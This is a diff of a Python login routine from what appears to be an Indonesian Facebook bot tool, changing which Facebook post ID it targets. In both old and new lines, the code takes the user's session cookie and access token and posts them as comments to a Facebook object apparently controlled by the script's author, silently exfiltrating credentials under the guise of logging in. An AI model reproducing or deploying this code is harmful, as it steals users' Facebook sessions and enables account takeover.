@@ -359,12 +359,12 @@ def login():
 		token = re.search('(EAAG\w+)',data.text).group(1)
 		tem      = ('\nSemangat Master @[100078878940801:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n')
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://m.facebook.com/photo.php/?fbid=1667011730417990') ### --- JANGAN DI GANTI --- ###
-		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"]) ### --- JANGAN DI GANTI --- ###
-		#ses.post(f"https://graph.facebook.com/672104641594118?fields=subscribers&access_token={token}",headers=(cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={cookie}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={token}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
-		ses.post(f"https://graph.facebook.com/672104641594118/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ### --- JANGAN DI GANTI --- ###
+		link = ('https://www.facebook.com/photo?fbid=1672257059893457&set=a.161861817599663')
+		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"])
+		#ses.post(f"https://graph.facebook.com/1672257249893438?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={token}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
